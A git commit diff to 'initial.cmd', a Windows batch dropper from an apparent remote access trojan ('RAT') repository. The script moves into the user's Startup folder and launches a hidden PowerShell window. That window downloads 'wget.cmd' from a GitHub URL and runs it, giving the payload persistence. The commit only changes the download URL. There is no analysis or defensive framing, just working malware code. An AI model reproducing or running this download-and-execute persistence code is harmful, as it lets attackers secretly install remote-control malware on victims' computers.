9ca86691fb910ea4e43af6fa287766d124073989
peterpapath <peterpapath@gmail.com>
2024-10-26 18:17:32 +0300

    changes

--- initial.cmd
+++ initial.cmd
@@ -10,7 +10,7 @@ set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Pr
 cd "%STARTUP%"
 
 @REM write payloads to startup
-powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://github.com/peterpapath/RAT/main/files/wget.cmd -OutFile wget.cmd"
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://github.com/peterpapath/RAT/tree/main/files/wget.cmd -OutFile wget.cmd"
 
 @REM run payload
 powershell ./wget.cmd
